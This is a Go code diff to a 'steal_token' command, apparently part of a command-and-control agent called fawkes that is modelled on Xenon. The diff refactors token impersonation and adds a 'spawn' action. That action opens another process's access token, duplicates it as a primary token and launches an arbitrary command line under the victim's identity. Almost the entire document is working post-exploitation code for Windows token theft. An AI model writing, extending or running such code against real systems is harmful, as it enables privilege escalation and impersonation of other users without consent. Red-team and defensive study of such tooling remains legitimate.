@@ -6,6 +6,7 @@ package commands
 import (
 	"encoding/json"
 	"fmt"
+	"strings"
 	"unsafe"
 
 	"fawkes/pkg/structs"
@@ -20,11 +21,13 @@ func (c *StealTokenCommand) Name() string {
 }
 
 func (c *StealTokenCommand) Description() string {
-	return "Steal and impersonate a token from another process"
+	return "Steal and impersonate a token from another process, or spawn a process with a stolen token"
 }
 
 type StealTokenParams struct {
-	PID int `json:"pid"`
+	PID     int    `json:"pid"`
+	Action  string `json:"action"`  // "impersonate" (default) or "spawn"
+	Command string `json:"command"` // Command line for spawn action
 }
 
 // Execute implements Xenon's TokenSteal function from Token.c (lines 106-183)
@@ -39,6 +42,27 @@ func (c *StealTokenCommand) Execute(task structs.Task) structs.CommandResult {
 		return errorResult("PID is required")
 	}
 
+	// Default action is impersonate
+	action := strings.ToLower(params.Action)
+	if action == "" {
+		action = "impersonate"
+	}
+
+	switch action {
+	case "impersonate":
+		return stealTokenImpersonate(params.PID)
+	case "spawn":
+		if params.Command == "" {
+			return errorResult("command parameter is required for spawn action")
+		}
+		return stealTokenSpawn(params.PID, params.Command)
+	default:
+		return errorf("Unknown action: %s (use impersonate or spawn)", action)
+	}
+}
+
+// stealTokenImpersonate is the original steal-token behavior: steal and impersonate.
+func stealTokenImpersonate(pid int) structs.CommandResult {
 	// Get current identity before stealing
 	oldIdentity, _ := GetCurrentIdentity()
 
@@ -48,57 +72,47 @@ func (c *StealTokenCommand) Execute(task structs.Task) structs.CommandResult {
 	}
 
 	// Open target process with PROCESS_QUERY_INFORMATION
-	// Xenon Token.c line 124: OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, Pid)
 	// Try PROCESS_QUERY_INFORMATION first, fall back to PROCESS_QUERY_LIMITED_INFORMATION
-	hProcess, err := windows.OpenProcess(PROCESS_QUERY_INFORMATION, false, uint32(params.PID))
+	hProcess, err := windows.OpenProcess(PROCESS_QUERY_INFORMATION, false, uint32(pid))
 	if err != nil {
-		// Try with limited information access (works on more processes)
-		hProcess, err = windows.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, uint32(params.PID))
+		hProcess, err = windows.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, uint32(pid))
 		if err != nil {
-			return errorf("OpenProcess failed for PID %d: %v (check permissions/SeDebugPrivilege)", params.PID, err)
+			return errorf("OpenProcess failed for PID %d: %v (check permissions/SeDebugPrivilege)", pid, err)
 		}
 	}
 	defer windows.CloseHandle(hProcess)
 
 	// Open process token
-	// Xenon Token.c line 129: OpenProcessToken(hProcess, TOKEN_ALL_ACCESS, &hToken)
-	// Using specific access rights instead of TOKEN_ALL_ACCESS for better compatibility
 	var hToken windows.Token
-
-	// Try TOKEN_ALL_ACCESS first (works if we have SeDebugPrivilege or elevated)
 	err = windows.OpenProcessToken(hProcess, windows.TOKEN_ALL_ACCESS, &hToken)
 	if err != nil {
-		// Fall back to specific rights needed for impersonation
 		err = windows.OpenProcessToken(hProcess, STEAL_TOKEN_ACCESS, &hToken)
 		if err != nil {
-			return errorf("OpenProcessToken failed for PID %d: %v", params.PID, err)
+			return errorf("OpenProcessToken failed for PID %d: %v", pid, err)
 		}
 	}
 
 	// Get target identity for output
 	targetIdentity, _ := GetTokenUserInfo(hToken)
 
-	// Impersonate using the primary token first (Xenon Token.c line 134-141)
-	// This is a direct impersonation of the process token
+	// Impersonate using the primary token first
 	ret, _, err := procImpersonateLoggedOnUser.Call(uintptr(hToken))
 	if ret == 0 {
 		hToken.Close()
 		return errorf("ImpersonateLoggedOnUser failed: %v", err)
 	}
 
-	// Duplicate the token for storage (Xenon Token.c lines 143-157)
-	// DuplicateTokenEx with SecurityDelegation and TokenPrimary
+	// Duplicate the token for storage
 	var duplicatedToken windows.Token
 	err = windows.DuplicateTokenEx(
 		hToken,
 		windows.MAXIMUM_ALLOWED,
-		nil, // Security attributes
+		nil,
 		windows.SecurityDelegation,
 		windows.TokenPrimary,
 		&duplicatedToken,
 	)
 	if err != nil {
-		// Try with SecurityImpersonation instead
 		err = windows.DuplicateTokenEx(
 			hToken,
 			windows.MAXIMUM_ALLOWED,
@@ -109,16 +123,14 @@ func (c *StealTokenCommand) Execute(task structs.Task) structs.CommandResult {
 		)
 		if err != nil {
 			hToken.Close()
-			// Revert since we couldn't duplicate
 			procRevertToSelf.Call()
 			return errorf("DuplicateTokenEx failed: %v", err)
 		}
 	}
 
-	// Close original token, we'll use the duplicate
 	hToken.Close()
 
-	// Impersonate with the duplicated token (Xenon Token.c lines 159-167)
+	// Impersonate with the duplicated token
 	ret, _, err = procImpersonateLoggedOnUser.Call(uintptr(duplicatedToken))
 	if ret == 0 {
 		windows.CloseHandle(windows.Handle(duplicatedToken))
@@ -140,17 +152,83 @@ func (c *StealTokenCommand) Execute(task structs.Task) structs.CommandResult {
 		return errorf("Token stolen but failed to verify identity: %v", err)
 	}
 
-	// Format output
 	var output string
 	if targetIdentity != "" {
-		output = fmt.Sprintf("Stole token from PID %d (%s)\n", params.PID, targetIdentity)
+		output = fmt.Sprintf("Stole token from PID %d (%s)\n", pid, targetIdentity)
 	} else {
-		output = fmt.Sprintf("Stole token from PID %d\n", params.PID)
+		output = fmt.Sprintf("Stole token from PID %d\n", pid)
 	}
 	if oldIdentity != "" {
 		output += fmt.Sprintf("Old: %s\n", oldIdentity)
 	}
 	output += fmt.Sprintf("New: %s", newIdentity)
+
+	return successResult(output)
+}
+
+// stealTokenSpawn steals a token from a process and uses it to spawn a new process.
+// The token is not stored for impersonation — the spawned process runs independently
+// under the stolen token's security context.
+func stealTokenSpawn(pid int, cmdLine string) structs.CommandResult {
+	// Open target process
+	hProcess, err := windows.OpenProcess(PROCESS_QUERY_INFORMATION, false, uint32(pid))
+	if err != nil {
+		hProcess, err = windows.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, uint32(pid))
+		if err != nil {
+			return errorf("OpenProcess failed for PID %d: %v (check permissions/SeDebugPrivilege)", pid, err)
+		}
+	}
+	defer windows.CloseHandle(hProcess)
+
+	// Open process token
+	var hToken windows.Token
+	err = windows.OpenProcessToken(hProcess, windows.TOKEN_ALL_ACCESS, &hToken)
+	if err != nil {
+		err = windows.OpenProcessToken(hProcess, STEAL_TOKEN_ACCESS, &hToken)
+		if err != nil {
+			return errorf("OpenProcessToken failed for PID %d: %v", pid, err)
+		}
+	}
+	defer hToken.Close()
+
+	// Duplicate to a primary token for CreateProcessWithTokenW
+	var primaryToken windows.Token
+	err = windows.DuplicateTokenEx(
+		hToken,
+		windows.MAXIMUM_ALLOWED,
+		nil,
+		windows.SecurityDelegation,
+		windows.TokenPrimary,
+		&primaryToken,
+	)
+	if err != nil {
+		// Fallback: try with SecurityImpersonation
+		err = windows.DuplicateTokenEx(
+			hToken,
+			windows.MAXIMUM_ALLOWED,
+			nil,
+			windows.SecurityImpersonation,
+			windows.TokenPrimary,
+			&primaryToken,
+		)
+		if err != nil {
+			return errorf("DuplicateTokenEx failed: %v", err)
+		}
+	}
+	defer windows.CloseHandle(windows.Handle(primaryToken))
+
+	// Spawn process with the stolen token
+	result, err := spawnWithToken(primaryToken, cmdLine)
+	if err != nil {
+		return errorf("Failed to spawn process: %v", err)
+	}
+
+	output := fmt.Sprintf("Spawned process with stolen token from PID %d\n", pid)
+	if result.Identity != "" {
+		output += fmt.Sprintf("Token identity: %s\n", result.Identity)
+	}
+	output += fmt.Sprintf("New PID: %d\n", result.PID)
+	output += fmt.Sprintf("Command: %s", cmdLine)
 
 	return successResult(output)
 }
